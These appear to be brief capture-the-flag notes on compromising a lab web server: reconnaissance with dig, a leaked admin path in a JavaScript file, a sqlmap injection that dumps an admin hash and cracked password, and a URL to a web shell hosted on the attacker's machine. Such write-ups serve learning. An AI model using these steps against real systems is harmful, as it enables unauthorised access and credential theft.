Looks like two bins on port 5555 and 7777


```
$ dig -x 10.13.37.10 @10.13.37.10

; <<>> DiG 9.14.9 <<>> -x 10.13.37.10 @10.13.37.10
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44128
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.	IN	PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 78 msec
;; SERVER: 10.13.37.10#53(10.13.37.10)
;; WHEN: Wed Jan 08 16:34:54 GMT 2020
;; MSG SIZE  rcvd: 109
```

```
http://www.securewebinc.jet/js/secure.js
```


"function getStats()
{
    $.ajax({url: \"/dirb_safe_dir_rf9EmcEIx/admin/stats.php\",

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);"

```
http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
```


## Bypassing Authentication

```
 sqlmap -r `pwd`/r.txt --database jetadmin -dbs --dump
 ```


```
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

```
admin:Hackthesystem200
```

## Command


http://10.13.14.7:8000/shell.php